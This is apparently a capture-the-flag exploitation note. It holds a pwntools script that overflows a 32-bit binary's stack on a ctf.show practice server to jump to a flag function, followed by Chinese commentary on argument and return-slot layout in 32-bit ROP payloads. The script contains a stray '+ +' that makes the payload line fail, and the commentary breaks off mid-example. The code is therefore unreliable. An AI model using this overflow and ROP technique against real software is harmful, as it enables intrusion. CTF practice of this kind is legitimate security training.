









```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28257)
flag = 0x08048586
fp = 876  # first_parameter
sp = 877  # second_parameter
payload = cyclic(0x6C + 0x4) + p32(flag) + + p32(0) + p32(fp) + p32(sp)
r.sendline(payload)
r.interactive()
```

> 参数顺序
> 32位中先写函数，再写参数【参数可能是返回值，如调用system，需要多加个参数作返回值】【8月10日更改，做了这么多题，发现32bit的payload中，最后一个函数如果需要参数那么都需要多加一个参数作返回值】【8月12日补充，又做一些题，进一步明白，每个函数都有返回值，而我们对函数返回值不感兴趣【比如一些函数执行成功会返回1】只需要有个位置充当一下，而之前对于多个函数的解释也进一步得以优化，其应该是需要返回值的，只不过位置正好被其他的东西给占据了，如pop_这些用于给参数位置的rop链给一举两得给占据了，也就是说，即使是最后一个函数有参数，也不用在单独写一个p32(0)来填充返回值的位置，因为pop_已经将这件事给做了 ，例如payload = cyclic(0x2c + 4) + p32(func1) + p32(func2) + p32(pop_ebx) + p32(0xACACACAC) + p32(flag) + p32(pop_ebx) + p32(0xBDBDBDBD)

